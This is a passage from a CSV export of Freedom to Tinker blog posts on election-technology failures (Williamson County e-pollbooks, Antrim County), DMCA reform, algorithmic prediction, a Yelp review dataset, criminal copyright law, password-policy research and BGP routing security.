use optical-scan voting machines to count paper ballots, because those computers, when they are not hacked, are much more accurate than humans. But we must protect against bugs, against misconfigurations, against hacking, by always performing risk-limiting audits, by hand, of an appropriate sample of the paper ballots that the voters marked themselves."
"7","2023-02-16","2023-03-24","https://freedom-to-tinker.com/2023/02/16/unrecoverable-election-screwup-in-williamson-county-tx/","In the November 2020 election in Williamson County, Texas, flawed e-pollbook software resulted in voters inadvertently voting for candidates and questions not from their own districts but from others in the same county. These voters were deprived of the opportunity to vote for candidates they were entitled to vote for—and their votes were wrongly counted in elections that they shouldn’t have voted in. This wasn’t the voters’ fault, but it does mean that the results in elections for local offices were affected by this screwup by Tenex Software Solutions. Tenex’s e-pollbook malfunctions call into question the results of the 2020 school district races, municipal elections, potentially a county commissioners race, and state legislative races in Williamson County. As more and more states use e-pollbooks in vote centers, election administrators should understand this failure, because it could potentially affect any kind of e-pollbook that prints ballots on demand. I’ve written about other screwups caused by election software or hardware—in Antrim County MI, in Windham NH, in Mercer County NJ—but in all those cases, voters marked the paper ballots they were entitled to vote on, and election officials can and did recount those ballots to report accurate election results. That is, all those screwups were recoverable, and election officials took immediate action to recount and recover—to get an accurate result. But in Williamson County, the mistake was unrecoverable. Once the voters have been given the wrong ballots, then no amount of recounting can recover a fully valid election result. Because all these voters were in the same county, this screwup did not affect any countywide offices, statewide offices, or the Presidential election: any countywide or statewide candidate would be on every ballot in the county, so all those votes could be cast and counted accurately. But for local races and referendum questions, and for state legislative districts, voters registered in those localities did not seem to be the ones actually voting. Here’s what happened: Williamson County used vote centers, both for early voting in person (October 13-30) and on Election Day (November 3). Under the vote-center model, used in several states now, the voter can cast ballots at any vote center in the county. But each voter must receive a ballot presenting the candidates and contests local to their own district (in addition to the county-wide and state-wide candidates). Polling places in the U.S. have a pollbook, a list of all the voters registered to vote at that location, with (typically) name, address, and signature. The voter signs the book, and the poll worker enables the voter to cast the appropriate ballot. That’s to make sure that only registered voters can vote, and prevent voters from voting twice. Vote centers need e-pollbooks, a networked system of electronic tablet computers, to make sure the voter doesn’t travel to multiple vote centers and vote in each one. Sure, go ahead and put a networked system of computers in the polling place, filled with layers of complicated software to configure—what could possibly go wrong? From almost the beginning of the early voting period (October 18) through election day, voters and poll workers reported a problem: voters given the wrong ballot by the e-pollbook system. County election officials discussed the problem in e-mails; the problem persisted. The vendor applied a fix, but to me the fix looks fragile, so this problem may lurk in wait for any county nationwide that uses Tenex e-pollbooks with ES&S ExpressVote voting machines. The problem is this: Once the voter’s name and address are confirmed in the tablet computer running the Tenex e-pollbook software, the e-pollbook (when used with ExpressVote voting machines as in Williamson County) prints out a ballot card marked with a barcode indicating the ballot style (that is, the locality in which this voter is entitled to vote). Other than the barcode, the ballot card is mostly blank. The voter takes this card over to an ExpressVote ballot-marking device, inserts the card, and the ExpressVote displays on its touchscreen the contests to vote on. After the voter has selected candidates, the ExpressVote prints onto that same ballot card those selections, both in barcode form and in plain-text form. (Well, it prints those selections if the ExpressVote hasn’t been hacked to cheat; but there’s no evidence that the ExpressVotes were hacked in Williamson County.) But in many cases, the Tenex e-pollbooks were printing the wrong barcode onto the ballot, enabling the voter to vote in the wrong district. Based on affidavits from poll workers in different vote centers on different dates, and on e-mails exchanged by administrators in the Williamson Department of Elections, we have a pretty good idea what computer glitch caused the problem: the computer’s print queue. When you print a document from your PC, it goes into a print queue, waiting for its turn to be transmitted over a network to your printer. Maybe you’ve had the experience of, press Print, nothing happens. Press Print again, then eventually two copies of the document come off the printer. In the Tenex/ExpressVote setup, each e-pollbook has its own attached printer, but the e-pollbook’s operating system still maintains a print queue. In Williamson County, October-November 2020, sometimes the voter would be checked in at the pollbook, the poll worker would press Print to create the ballot card—then no ballot card would come out right away, so the poll worker would press Print again, and perhaps again after that, resulting in multiple copies. The voter from Hutto would take their Hutto ballot card to the ExpressVote, and vote. Then the next voter shows up, perhaps from Round Rock, be checked in, the poll worker presses Print, and inadvertently hands the Round Rock voter (the second copy of) the Hutto ballot, printed from that extra time the poll worker pressed Print. Now suppose another voter arrives, from Bushy Creek. That voter will get the third ballot printed, which is for Round Rock—the Bushy Creek voter will be voting in the Round Rock election! For the rest of the day, every voter will get a previous voter’s ballot. There’s no way to fix this with a recount. A recount can only tally what’s printed on the paper, and what’s printed on the paper is from voters in the wrong districts. Besides the print queue problem, there were other glitches with the Tenex e-pollbooks: ballot cards with the wrong precinct-code (but the right candidates). In the days after November 3, the Williamson County Elections Administrator Christopher J. Davis was not able to produce a precinct-by-precinct report of the vote totals (as required by Texas law). Mr. Davis thought he could produce such a report by sorting and recounting the paper ballots by hand, so on November 10 he asked a district court judge to order such a recount. It took eight months for the Williamson County Elections Department to complete this recount and produce such a report. When Mr. Davis went into court on November 10, he explained this other mistake in e-pollbook programming: failure to mark a precinct-number on some ballots. That mistake could be resolved by recounting the ballots. But he did not tell the court about the print-queue problem. That’s a big problem. In other cases I’ve written about (Antrim, Windham, Mercer), election officials (and the public) could be reasonably confident that the recount got the correct result. But in Williamson County, if it’s really the case that thousands of voters got ballots for the wrong districts, then it would be impossible for Mr. Davis’s office to produce accurate and meaningful results for the November 3 election (for local contests smaller than countywide). When he stated under oath on November 10, “Voters were being given the correct ballot style, they were voting on all the precise races and contests that they were eligible for when they voted in person during early voting” he had already sent an e-mail to his own staff on October 18 with a detailed analysis concluding, Because if there was some kind of mishap with the previous voter at that station, it might be possible that the [ballot style] for them is repeated for the next voter. I have to wonder how many voters are voting an incorrect ballot… Clearly Mr. Davis was in a bind. If he stated clearly that the problem was impossible to recover from, then someone would have to ask a judge to order a new election for every local (less than countywide) office. That would be highly embarrassing and expensive. Could his eight-month delay in reporting results have been because it was difficult to reconcile precinct-by-precinct results that didn’t really add up right? The Tenex e-pollbook malfunctions call into question the results of the 2020 school district races, municipal elections, potentially a County Commissioners Court race, and State Congressional races in Williamson County. When e-pollbooks again gave some voters the wrong ballots in the March 2022 primary election, after redistricting had split the county between two congressional districts, it could have affected the U.S. Congressional election as well. In October 2022 I noticed that Morris County NJ was using a similar combination of Tenex e-pollbooks with ES&S ballot cards. I asked the Morris County Administrator of Elections whether he was aware of the print-queue problem, and he responded: Our e-Pollbook vendor, Tenex, has stated the incident was the result of a timer on the popup that the Texas county did not have turned on to prevent the poll worker from pressing the print button multiple times. In Morris County, the reprint button is actually grayed out for 10 seconds after the print button is pressed to give it time to process. Tenex confirmed this setting is on for all e-Pollbook clients that use the ExpressVote printers and is not an issue for any of their clients. So it appears that the print-queue-wrong-ballot problem is really a thing, that Tenex patched the problem with a popup, that if one is not careful with installation and configuration then it could happen again. And what if the printer takes more than 10 seconds to wake up? I don’t have a lot of confidence in this band-aid fix, “gray out the reprint button for 10 seconds.” Beware of using Tenex e-pollbooks in combination with ExpressVote touchscreens. Conclusion: a train wreck Some ways of running Early Vote Centers are susceptible to a failure mode in which computer software error can lead to wrong and uncorrectable election results. This is not simply about Tenex and ExpressVote. If the software controls what ballot the voter is given, and if the poll worker cannot easily check, or does not routinely check, that it’s the right ballot for the voter’s address, then software error can cause many voters to vote the wrong ballot. As long as software is fallible, we should not design election systems in which software error leads to unrecoverable election failure. This article is based in large part on documents obtained by a Texas citizen using Texas Public Information Act requests."
"8","2021-04-05","2023-03-24","https://freedom-to-tinker.com/2021/04/05/expert-analysis-of-antrim-county-michigan/","Preliminary unofficial election results posted at 4am after the November 3rd 2020 election, by election administrators in Antrim County Michigan, were incorrect by thousands of votes–in the Presidential race and in local races. Within days, Antrim County election administrators corrected the error, as confirmed by a full hand recount of the ballots, but everyone wondered: what went wrong? Were the voting machines hacked? The Michigan Secretary of State and the Michigan Attorney General commissioned an expert to conduct a forensic examination. Fortunately for Michigan, one of the world’s leading experts on voting machines and election cybersecurity is a professor at the University of Michigan: J. Alex Halderman. Professor Halderman submitted his report to the State on March 26, 2021 and the State has released the report. Analysis of the Antrim County, Michigan November 2020 Election Incident J. Alex Halderman March 26, 2021 And here’s what Professor Halderman found: “In October, Antrim changed three ballot designs to correct local contests after the initial designs had already been loaded onto the memory cards that configure the ballot scanners. … [A]ll memory cards should have been updated following the changes. Antrim used the new designs in its election management system and updated the memory cards for one affected township, but it did not update the memory cards for any other scanners.” Here’s what that means: Optical-scan voting machines don’t (generally) read the text of the candidates’ names, they look for an oval filled in at a specific position on the page. The Ballot Definition File tells the voting machine what name corresponds to what position. And also informs the election-management system (EMS) that runs on the county’s election management computers how to interpret the memory cards that transfer results from the voting machines to the central computers. Shown here at left is the original ballot layout, and at right is the new ballot layout. I have added the blue rectangles to explain Professor Halderman’s report. Original (at left) and updated-October-2020 (at right) ballot layout for Village of Central Lake, MI. From Halderman’s report, Figure 1, page 12. Now, if the voting machine is loaded with a memory card with the ballot definition at left, but fed ballots in the format at right, what will happen? A voter’s mark next to the name “Melanie Eckhart” will be interpreted as a vote for “Mark Edward Groenink”. That is, in the first blue rectangle, you can see that the oval at that same ballot position is interpreted differently, in the two different ballot layouts. A voter’s mark next to “Yes” in Proposal 20-1 will be interpreted as “No” (as you can see by looking at the second blue rectangle). We’d expect that problem with any bubble-ballot voting system (though there are ways of preventing it, see below). But the Dominion’s results-file format makes the problem far worse. In Dominion’s file format for storing the results, every subsequent oval on the paper is given a sequential ID number, cumulative across all ballot styles used in the county. Now look at the figure above, just below the first blue rectangle. You’ll see that in the original “Local School District” race (at left) there are two write-in bubbles, but in the revised “Local School District” race (at right), there are three write-in bubbles. That means the ID number of every subsequent bubble, on this ballot and in all the ballot styles that come after it in this county, the ID numbers will be off by one. Figure 2 of the report illustrates: Figure 2 from Halderman report: D-Suite automatically assigns sequential ID numbers to voting targets across every ballot style. Correcting the ballot design for Central Lake Village required adding a write-in blank, which increased the ID number of every subsequent voting target by 1, including all targets in alphabetically later townships. Scanners in most precincts used the initial election definition (from before the change) and recorded votes under the old ID numbers. The EMS interpreted these ID numbers using the revised election definition, causing it to assign the votes to the wrong candidates. Within three days, Antrim County officials had basically figured out what went wrong, and corrected most of the errors before publishing and certifying official election results on November 6th. By November 21, Antrim County had corrected almost all of the errors in its official restatement of its election results. How do we know that the original results were wrong and the new results are right? That is, how do we know that the “corrected” results are true, and not fraudulent? We have two ways of knowing: Hand-marked paper ballots speak for themselves. The contest for President of the U.S. was recounted by hand in Antrim County. Those results–from what bipartisan workers and witnesses could see with their own eyes–matched the results from scanning the paper ballots using the ballot-definition file that matches the layout of the paper ballot. A careful forensic examination by a qualified expert can explain what happened, and that is why Professor Halderman’s report is so valuable–it explains things step by step. But not every contest was recounted by hand. The expert analysis finds a few contests where the reported vote totals are still incorrect; and in one of those contests (a marijuana ballot question) the outcome of the election was affected. In the court case of Bailey v. Antrim, plaintiffs had submitted a report (December 13, 2020) from one Russell J. Ramsland making many claims about the Dominion voting machines and their use in Antrim County: adjudication, error rates, log entries, software updates, Venezuela. Section 5 of Professor Halderman’s report addresses all of these claims and finds them unsupported by the evidence. What can we learn from all of this? Although the unofficial reports posted at 4am on November 4th showed Joseph R. Biden getting more votes in Antrim County than Donald J. Trump, the results posted November 6th show correctly that, in Antrim County, Mr. Trump got more votes. Regarding the presidential contest, election administrators figured this out for themselves without needing any experts. In other contests, where no recount was done, most of the errors got corrected, but not all. There is no evidence that Dominion voting systems used in Antrim County were hacked. And what can we learn about election administration in general? Hand marked paper ballots are extremely useful as a source of “ground truth”. If the ballot definition doesn’t match the paper ballot, results reported by the optical-scan voting machine can be nonsense. This has happened before–see my report describing a 2011 incident in New Jersey. “Unforced error:” Dominion’s election-management system (EMS) software doesn’t check candidate names. The EMS computer has a file mapping ballot-position numbers to candidate names; and the memory card uploaded from the voting machine has its own file mapping ballot-position numbers to candidate names. If only the EMS software had checked that these files agreed, then the problem would have been detected on election night, during the upload process. Even without that built-in checking, to catch mistakes like this before the election, officials should do the kind of end-to-end pre-election logic-and-accuracy testing described in Professor Halderman’s report. Risk-Limiting Audits (RLAs) could have detected and corrected this error, if they had been used systematically in the State of Michigan. RLAs are good protection not only against hacking, but also against mistakes and bugs."
"9","2013-03-05","2023-03-24","https://freedom-to-tinker.com/2013/03/05/white-house-statement-on-cell-phone-unlocking-a-first-step-toward-dmca-reform/","Yesterday, the White House officially responded to the online petition to “Make Unlocking Cell Phones Legal,” which garnered more than 100,000 signatures in under 30 days. The Administration’s headline was emphatic: “It’s Time to Legalize Cell Phone Unlocking.” The tech press heralded this significant but symbolic first step in addressing some of the most egregious shortcomings of the Digital Millennium Copyright Act (DMCA). I hope the White House’s response signals a new chapter in the struggle to regain the freedom to innovate, research, create, and tinker. Last week, I discussed the petition and its context with Derek Khanna, who has been a champion of the cause. You can watch the video here: As Derek pointed out, this battle is connected to a much larger policy problem: the DMCA bans many practices that are good for society–and without clear counterbalancing benefits. Reading the White House statement, it is hard to tell whether the Administration appreciates this fact. First, some history. The DMCA passed in 1998, under the faulty assumption that it would protect against piracy. The Act put significant restrictions on the ability to study digital technologies. It also created a process by which, every three years, the Copyright Office (an arm of the Library of Congress) would review requests for exemptions to the new restrictions. As I observed in 2003, “It is abundantly clear by now that the DMCA has had a chilling effect on legitimate research related to access control technologies.” Yet requests by for research exemptions have been routinely denied, or at best arbitrarily narrowed by the Copyright Office to such an extent that they are rendered useless—even though DMCA threats have been used to silence researchers, including me. For example, in 2001 our team’s study of CD copy protection technologies could not be published as planned because of DMCA threats from the recording industry—the same people who had invited us to study the technologies. I am not overstating the case to say that the research implicated by the DMCA is critical to democracy. In 2003, Diebold threatened to sue students for researching their electronic voting machines. Other vendors followed suit in the years that followed. When my team performed research on widely-used voting machines, we feared a DMCA lawsuit. We knew we were in the right legally and would ultimately win a suit—but we also knew by experience how much damage a “strategic” DMCA threat could do. Ultimately we published a study revealing serious vulnerabilities which played a role—along with the efforts of many others across the country—in changing the national debate about electronic voting technology. Academic research is far from the only valuable activity that is put at risk by the DMCA. As Derek pointed out, the exemptions for technological accessibility for persons with disabilities are narrow and should never have been necessary in the first place. More generally, the right to examine and tinker with devices that you own (or to learn from someone else’s experience) should be presumptively legal. Copyright owners can and should retain the right to stop actual copyright infringement. The DMCA, on the other hand, forecloses an untold number of potential non-infringing innovations. The deep perversity of the DMCA is that it has failed to achieve its stated purpose–preventing unauthorized redistribution of copyrighted works. Technological protection measures do not deter true criminals, but the DMCA criminalizes citizens who seek to innovate. As copy protection technologies continue to fade away, the law that was intended to bolster them (but has failed to do so) will live on, zombie-like, to intimidate innovators. The White House’s response is significant. As it states, permitting cell phone “unlocking” is: …common sense, crucial for protecting consumer choice, and important for ensuring we continue to have the vibrant, competitive wireless market that delivers innovative products and solid service to meet consumers’ needs. Recognizing this common sense approach is important, but equally important is how the government implements this common sense. The White House’s response seems to delegate this task to the Federal Communications Commission. Perhaps the FCC will achieve something on this front, and perhaps it will not. But the FCC’s role is inherently limited, because the FCC does not have the power to overrule the Copyright Office’s decision, nor to overrule the provisions Congress wrote into the DMCA. The only way to really fix this mess—the common-sense solution—is to fix the DMCA."
"10","2014-07-30","2023-03-24","https://freedom-to-tinker.com/2014/07/30/are-we-rushing-to-judgment-against-the-hidden-power-of-algorithms/","Several recent news stories have highlighted the ways that online social platforms can subtly shape our lives. First came the news that Facebook has “manipulated” users’ emotions by tweaking the balance of happy and sad posts that it shows to some users. Then, this week, the popular online dating service OKCupid announced that it had deliberately sent its users on dates that it predicted would not go well. OKCupid asks users questions, and matches them up based on their answers (for example, “do you like horror movies?”), using the answers to compute a “match percentage” showing how likely two people are to get along. In the test that it disclosed this week, OKCupid explained, it displayed false match percentages for a few users — telling them that they were much better matched, or much worse matched, than the numbers actually predicted — in order to test how well the matching system predicted actual compatibility. Once the test was over, OKCupid informed users that their match percentages had been temporarily distorted. Many observers have objected to OKCupid’s “lying” to its users and to Facebook’s “emotional manipulation,” arguing that such tests should not happen invisibly or that people should be afraid of the way sites like these can shape their lives. These opaque, data-driven predictions of what news you’ll want from your network of friends, or who you might like to date, are scary in part because they have an element of self-fulfilling prophecy, a quality they share with more consequential “big data” predictions. In a civil rights context, automatic predictions can be particularly concerning because they may tend to reinforce existing disparities. For example, if historic arrest statistics are used to target law enforcement efforts, the history of over-enforcement in communities of color (which is reflected in these numbers) may lead to a system predicting more crime in those communities, bringing them under greater law enforcement scrutiny. Over time, minor crimes that occur in these communities may be prosecuted while the same crimes occurring elsewhere go unrecorded — leading to an exaggerated “objective” record of the targeted neighborhood’s higher crime rate. But just because predictions are opaque — and just because they are self-fulfilling prophecies — does not necessarily mean that they’ll turn out to be bad for people, or harmful to civil rights. Computerized, self-fulfilling prophecies of positive social justice outcomes could be a key tool for civil rights. One example of the opportunity for positive self-fulfilling prophecies may lie in education. There is strong evidence of self-fulfilling prophecies when students are told that they are likely or unlikely to do well in school. Those told they are likely to do better are, other things equal and just by dint of the prediction, likely to do better (a finding known as the “Pygmalion effect“). Meanwhile, when students are told that others like them have generally fared poorly, they become more likely to do poorly themselves (an effect known as “stereotype threat“). Educational tools that harness big data to provide feedback to students and teachers could, potentially, harness these effects. For example, a new system called Course Signals uses data mining to predict the likely future performance of college students in a particular course, rating them as green (on track to do well) yellow, or red (likely to do poorly). The designers of a system like Course Signals might choose to use the self-fulfilling nature of its predictions as a force for good, perhaps by predicting slightly better performances by striving but low-performing students than the first-order data about such students would initially appear to justify. In a case like that, the opaque nature of the predictions, and the automatic deference that human beings often accord to predictive analytics, might be pressed into service to advance educational equity. Increasingly pervasive, increasingly robust “big data” predictions may tend to entrench the status quo more thoroughly and more effectively than some of the pre-digital decision-making processes they are replacing. And that’s a reason for social justice advocates — whose most basic point is that some patterns still need to change — to be skeptical of such systems. But in the end, there are lots of goals that could be pursued through the manipulation of big data, and some of those goals may advance the social good. In offering these thoughts, I mean to invite further scrutiny of these systems and the ways that we use them. Many uses of such systems may be socially harmful, and it might turn out in the end that we would be best off sharply limiting the role of opaque predictions in our lives. But we should open ourselves to a wider-ranging conversation, one that acknowledges the possibility of socially constructive as well as discriminatory uses of the hidden power of algorithms."
"11","2022-09-14","2023-03-24","https://freedom-to-tinker.com/2022/09/14/we-are-releasing-three-longitudinal-datasets-of-yelp-review-recommendations-with-over-2-5m-unique-reviews/","By Ryan Amos, Roland Maio, and Prateek Mittal Online reviews are an important source of consumer information, play an important role in consumer protection, and have a substantial impact on businesses’ economic outcomes. Some of these reviews may be problematic; for example, incentivized reviews, reviews with a conflict of interest, irrelevant reviews, and entirely fabricated reviews. To address this problem, many review platforms develop systems to determine which reviews to show to users. Little is known about how such online reviews recommendations change over time. We introduce a novel dataset of Yelp reviews to study these changes, which we call reclassification. Studying reclassification can help understand the validity of prior work that depends on Yelp’s labels, evaluate the existing classifier, and shed light on the fairly opaque process of review recommendation. Data Overview Our data is sourced from Yelp between 2020 and 2021 and contains reviews that Yelp classifies as “Recommended” and “Not Recommended,” with a total of 2.2 million reviews described in 12.5 million data points. Our data release consists of three datasets: a small dataset with an eight year span (when combined with prior work), a large dataset concentrated in the Chicago area, and a large dataset spread across the US and stratified by population density and household income. The data is pseudonymized to protect reviewer privacy, and the analyses in our corresponding paper can be reproduced with the pseudonymous data. Obtaining Access Please visit our website for more information on requesting access: https://sites.google.com/princeton.edu/longitudinal-review-data"
"12","2014-08-07","2023-03-24","https://freedom-to-tinker.com/2014/08/07/criminal-copyright-sanctions-as-a-u-s-export/","The copyright industries’ mantra that “digital is different” has driven an aggressive, global expansion in criminal sanctions for copyright infringement over the last two decades. Historically speaking, criminal penalties for copyright infringement under U.S. law date from the turn of the 20th century, which means that for over a hundred years (from 1790 to 1897), copyright infringement was exclusively a civil cause of action. From 1897 to 1976, there were criminal penalties, but only misdemeanor ones. In 1976, felony penalties were introduced, but only for repeat offenders. Following enactment of the 1976 Copyright Act, the pace of amendments expanding criminal liability greatly accelerated—a trend that more or less coincided with the PC revolution. In 1982, felony penalties were extended to some first-time offenses, but not for all types of copyrighted works. In 1992, felony penalties were extended to all types of works. In 1997, as the commercial Internet was beginning its exponential growth, the No Electronic Theft (NET) Act eliminated a longstanding requirement of commercial motive for criminal liability, making some infringements criminally actionable even if they are undertaken without any expectation of financial gain. Under the NET Act, a willful infringer acting without any commercial motive faces up to three years in prison for reproducing or distributing as few as 10 unauthorized copies of a copyrighted work. As criminal penalties have ballooned domestically, they have also been expanding internationally. The international expansion in criminal copyright liability has occurred in part (and increasingly) through the vehicle of plurilateral and bilateral trade agreements. The United States uses its negotiating leverage in the trade policy arena to pressure trading partners, particularly less powerful ones, to incorporate strict IP norms into their domestic law. Much of the controversy surrounding the Anti-Counterfeiting Trade Agreement (ACTA) a few years ago and, more recently, the Trans-Pacific Partnership (TPP) Agreement is related to this strategy of IP norm exportation, which has become a key feature of U.S. international trade policy. Administration officials are explicit about this strategy, as revealed, for example, in the 2013 Joint Strategic Plan for the White House Office of the Intellectual Property Enforcement Coordinator (IPEC): “The U.S. Government leverages a range of trade policy tools to promote strong intellectual property rights protection and enforcement, including…trade agreements…and high-level bilateral engagement.” A very troubling story on the import side of this international IP policymaking dynamic is currently unfolding in Colombia. A Colombian graduate student named Diego Gomez has found himself on the wrong side of a domestic criminal copyright law enacted to comply with the 2006 US-Colombia Free Trade Agreement. Diego’s story has been covered a bit by tech bloggers, and his legal case has been taken up by a Colombian digital rights advocacy organization. His offense? He posted a copy of a fellow scholar’s academic paper on Scribd without that scholar’s permission. The paper was taken down, but the aggrieved copyright owner pressed for criminal charges to be filed, and a willing prosecutor complied. Diego’s criminal exposure under Colombian law? Four to eight years (!) in prison. According to the Electronic Frontier Foundation’s legal analysis, there is a good chance that Diego will prevail on the merits of his case under Colombian court decisions requiring judges to consider whether an alleged criminal infringer had a commercial motive. A hearing in the case is scheduled for September. I hope that the EFF’s analysis proves to be correct or, even more optimistically, that the case is dismissed before the hearing occurs. Whatever Diego’s fate, his case shines a bright light on the lack of proportionality in contemporary criminal copyright law – both the law we’ve made here in the United States and the law we’re making our trading partners make as the price of doing business with us on favorable terms."
"13","2015-01-13","2023-03-24","https://freedom-to-tinker.com/2015/01/13/cyberterrorism-or-cybervandalism/","When hackers believed by the U.S. government to have been sponsored by the state of North Korea infiltrated Sony Pictures’ corporate network and leaked reams of sensitive documents, the act was quickly labeled an act of “cyberterrorism.” When hackers claiming to be affiliated with ISIS subsequently hijacked the YouTube and Twitter accounts of the U.S. military’s Central Command, military officials called it an act of “cybervandalism.” A third category of cyberattack, which presents definitional challenges of its own, is “cyberwarfare.” In terms of the nature and scale of any official response, it obviously matters quite a lot which bucket the government and the media choose when they categorize a cyberattack to the public. So how is that choice made as a descriptive matter? And how should it be made? It seems to me that there are several potentially relevant factors to assess when drawing the semantic line between cyberterrorism and cybervandalism. The ones that spring to mind are the origin of the attack (e.g., state-sponsored v. state-aligned v. unaligned); the target of the attack (e.g., public infrastructure v. corporate infrastructure; critical infrastructure—however defined—v. non-critical infrastructure); the nature of the harm caused (e.g., personal injury v. injury to property); and the reach and severity of the harm caused (e.g., minor or major; isolated v. pervasive). Are these the right factors to take into account? If so, what configuration of factors makes a cyberattack an act of cyberterrorism as opposed to an act cybervandalism? And how should we distinguish both cyberterrorism and cybervandalism from cyberwarfare? Is cyberwarfare only state-to-state? As the Internet is increasingly beset by attacks of all kinds from all quarters in the name of all different ideologies (or just lulz), it seems vital to have in place a stable, rational way of classifying cyberattacks so that official responses can be appropriate and proportional. I know there are a lot of cybersecurity experts who read FTT. I am definitely not one. I’d love to hear your thoughts about a principled taxonomy for cyberattacks. If there’s a good article about this out there somewhere, I’d be happy to get the citation."
"14","2017-10-25","2023-03-24","https://freedom-to-tinker.com/2017/10/25/howto-protect-your-small-organization-against-electronic-adversaries/","October is “cyber security awareness month“. Among other notable announcements, Google just rolled out “advanced protection” — free for any Google account. So, in the spirit of offering pragmatic advice to real users, I wrote a short document that’s meant not for the usual Tinker audience but rather for the sort of person running a small non-profit, a political campaign, or even a small company. If there’s one thing we learned from the leaks of the DNC emails during the 2016 presidential campaign it’s this: cyber-security matters. Whether or not you believe that the release of private campaign emails cost Clinton the election, they certainly influenced the process to the extent that any political campaign, any small non-profit, and any advocacy group has to now consider the possible impacts of cyber-attacks against their organizations. These could involve espionage (i.e., internal secrets being leaked) or sabotage (i.e., internal data being corrupted or destroyed). And your adversaries might be criminal hackers or foreign nation-state governments. If you were a large multinational corporation, you’d have a dedicated team of security specialists to manage your organization. Unfortunately, you’re not and you can’t afford such a team. To help out, I’ve written a short document summarizing low-cost tactics you can take to reduce your vulnerabilities using simple techniques like two-factor authentication, so a stolen password isn’t enough for an attacker to log into your account. This document also recommends particular software and hardware configurations that move your organization “into the cloud” where providers like Google or Microsoft have security professionals who do much of the hard work on your behalf. Enjoy! https://www.cs.rice.edu/~dwallach/howto-electronic-adversaries.pdf"
"15","2022-06-22","2023-03-24","https://freedom-to-tinker.com/2022/06/22/most-top-websites-are-not-following-best-practices-in-their-password-policies/","By Kevin Lee, Sten Sjöberg, and Arvind Narayanan Compromised passwords have consistently been the number one cause of data breaches by far, yet passwords remain the most common means of authentication on the web. To help, the information security research community has established best practices for helping users create stronger passwords. These include: Block weak passwords that have appeared in breaches or can be easily guessed. Use a strength meter to give users helpful real-time feedback. Don’t force users to include specific character-classes in their passwords. While these recommendations are backed by rigorous research, no one has thoroughly investigated whether websites are heeding the advice. In a new study, we empirically evaluated compliance with these best practices. We reverse-engineered the password policies at 120 of the top English-language websites, like Google, Facebook, and Amazon. We found only 15 of them were following best practices. The remaining 105 / 120 either leave users at risk for password compromise or frustrated from being unable to use a sufficiently strong password (or both). The following table summarizes our findings: We compare our key findings with best practices from prior research. We found that more than half of the websites allowed the most common passwords, like “123456”, to be used. Attackers can guess these passwords with minimal effort, which opens the door to account hijacking. Amazon allowed us to change the password on our account to “11111111”, a common and easily-guessed password. Few websites had adopted strength meters, and of those, we found websites misusing meters to encourage complex passwords over strong, hard-to-guess passwords (e.g., preferring the predictable “Password123” over “bdmt7gg82nkc”—which we had randomly generated on our password manager). This not only defeats the purpose of password strength meters, but can lead to more user frustration. Facebook using its password strength meter as a nudge towards incorporating specific character types in passwords. Finally, we found almost half of the websites requiring users to include specific character-classes in their password, despite decades of research against it and outcry from users themselves. Intuit requires passwords include uppercase characters, lowercase characters, numbers, and symbols. Our study reveals a huge gap between research and practice when it comes to password policies. Passwords have been heavily researched, yet few websites have implemented password policies that reflect the lessons learned. At the same time, research has not paid attention to practice. In our paper, we discuss ways for both sides to come together to address this disconnect. One idea for future research: directly engage with system administrators, in order to understand their mindset on password security. Perhaps password policy is meant to be security theater—giving users a sense of safety without actually improving security. Or maybe websites have shifted their attention to adopting other authentication technologies, like SMS-based multi-factor authentication (which also suffers from severe weaknesses, as we discovered in previous research on SIM swaps and number recycling). Perhaps websites have to deal with security audits from firms like Deloitte recommending outdated practices. Or maybe websites face other practical constraints that the information security community doesn’t know about. Our peer-reviewed paper is located at passwordpolicies.cs.princeton.edu."
"16","2022-04-19","2023-03-24","https://freedom-to-tinker.com/2022/04/19/a-multi-pronged-strategy-for-securing-internet-routing/","By Henry Birge-Lee, Nick Feamster, Mihir Kshirsagar, Prateek Mittal, Jennifer Rexford The Federal Communications Commission (FCC) is conducting an inquiry into how it can help protect against security vulnerabilities in the internet routing infrastructure. A number of large communication companies have weighed in on the approach the FCC should take. CITP’s Tech Policy Clinic convened a group of experts in information security, networking, and internet policy to submit an initial comment offering a public interest perspective to the FCC. This post summarizes our recommendations on why the government should take a multi-pronged strategy to promote security that involves incentives and mandates. Reply comments from the public are due May 11. The core challenge in securing the internet routing infrastructure is that the original design of the network did not prioritize security against adversarial attacks. Instead, the original design focused on how to route traffic through decentralized networks with the goal of delivering information packets efficiently, while not dropping traffic. At the heart of this routing system is the Border Gateway Protocol (BGP), which allows independently-administered networks (Autonomous Systems or ASes) to announce reachability to IP address blocks (called prefixes) to neighboring networks. But BGP has no built-in mechanism to distinguish legitimate routes from bogus routes. Bogus routing information can redirect internet traffic to a strategic adversary, who can launch a variety of attacks, or the bogus routing can lead to accidental outages or performance issues. Network operators and researchers have been actively developing measures to counteract this problem. At a high level, the current suite of BGP security measures depend on building systems to validate routes. But for these technologies to work, most participants have to adopt them or the security improvements will not be realized. In other words, it has many of the hallmarks of a “chicken and egg” situation. As a result, there is no silver bullet to address routing security. Instead, we argue, the government needs a cross-layer strategy that embraces pushing different elements of the infrastructure to adopt security measures that protect legitimate traffic flows using a carrot-and-stick approach. Our comment identifies specific actions Internet Service Providers, Content Delivery Networks and Cloud Providers, Internet Exchange Points, Certificate Authorities, Equipment Manufacturers, and DNS Providers should take to improve security. We also recommend that the government funds and supports academic research centers that collect real-time data from a variety of sources that measure traffic and how it is routed across the internet. We anticipate several hurdles to our recommended cross-layer approach: First, to mandate the cross-layer security measures, the FCC has to have regulatory authority over the relevant players. And, to the extent a participant does not fall under the FCC’s authority, the FCC should develop a whole-of-government approach to secure the routing infrastructure. Second, large portions of the internet routing infrastructure lie outside the jurisdiction of the United States. As such, there are international coordination issues that the FCC will have to navigate to achieve the security properties needed. That said, if there is a sufficient critical mass of providers who participate in the security measures, that could create a tipping point for a larger global adoption. Third, the package of incentives and mandates that the FCC develops has to account for the risk that there will be recalcitrant small and medium sized firms who might undermine the comprehensive approach that is necessary to truly secure the infrastructure. Fourth, while it is important to develop authenticated routes for traffic to counteract adversaries, there is an under-appreciated risk from a flipped threat model – the risk that an adversary takes control of an authenticated node and uses that privileged position to disrupt routing. There are no easy fixes to this threat – but an awareness of this risk can allow for developing systems to detect such actions, especially in international contexts."
